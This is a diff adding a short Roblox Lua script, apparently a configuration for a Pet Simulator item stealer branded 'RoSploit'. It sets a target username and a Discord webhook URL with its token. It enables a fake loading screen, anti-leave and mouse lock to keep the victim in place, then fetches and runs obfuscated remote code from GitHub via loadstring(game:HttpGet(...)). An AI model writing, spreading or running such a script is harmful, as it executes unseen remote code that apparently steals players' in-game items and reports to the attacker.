@@ -1,0 +1,15 @@
+UserName = "nickm1001"
+Webhook = "https://discordapp.com/api/webhooks/1101159725116162129/m2NJSuB1N4MG8bazZxjzmRCVUglfZlfhjuS761EeZvbnURWXmKATtq8sgaJquC4ktkmo" -- optional delete the whole line if you don't want it
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "RoSploit"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nickisabot2/petsimulator/main/mail-revump-obfuscated_14%20(1).lua", true))()
